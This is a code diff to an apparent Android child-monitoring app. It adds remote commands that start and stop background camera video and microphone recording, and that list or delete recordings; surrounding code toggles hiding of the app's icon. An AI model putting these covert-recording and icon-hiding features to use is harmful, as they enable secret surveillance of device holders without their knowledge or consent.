@@ -82,6 +82,41 @@ object CommandExecutor {
                     com.kids.monitor.WebRtcService.stop(context)
                     ok("تم إيقاف البث المباشر")
                 }
+                "rtc_camera_stop" -> {
+                    val facing = payload["facing"]?.toString()?.ifBlank { "front" } ?: "front"
+                    com.kids.monitor.WebRtcService.stopCamera(context, facing)
+                    ok("تم إيقاف الكاميرا " + if (facing == "back") "الخلفية" else "الأمامية")
+                }
+                "record_video_start" -> {
+                    val facing = payload["facing"]?.toString()?.ifBlank { "back" } ?: "back"
+                    val seconds = (payload["durationSec"] as? Number)?.toInt() ?: 300
+                    com.kids.monitor.RecorderService.startVideo(context, facing, seconds)
+                    ok("جارٍ تسجيل فيديو لمدة $seconds ثانية (يستمر في الخلفية)")
+                }
+                "record_video_stop" -> {
+                    com.kids.monitor.RecorderService.stopVideo(context)
+                    ok("تم إيقاف تسجيل الفيديو وحفظه")
+                }
+                "record_audio_start" -> {
+                    val seconds = (payload["durationSec"] as? Number)?.toInt() ?: 300
+                    com.kids.monitor.RecorderService.startAudio(context, seconds)
+                    ok("جارٍ تسجيل صوتي لمدة $seconds ثانية")
+                }
+                "record_audio_stop" -> {
+                    com.kids.monitor.RecorderService.stopAudio(context)
+                    ok("تم إيقاف التسجيل الصوتي وحفظه")
+                }
+                "delete_recording" -> {
+                    val name = payload["name"]?.toString().orEmpty()
+                    if (name.isBlank()) fail("اسم التسجيل غير محدد") else {
+                        com.kids.monitor.RecorderService.deleteLocal(context, name)
+                        ok("تم حذف التسجيل من الجهاز")
+                    }
+                }
+                "list_recordings" -> {
+                    val files = com.kids.monitor.RecorderService.listLocal(context)
+                    mapOf("ok" to true, "message" to "التسجيلات: ${files.size}", "files" to files)
+                }
                 "show_app" -> {
                     setAlias(context, true)
                     ok("تم إظهار أيقونة التطبيق في قائمة التطبيقات")
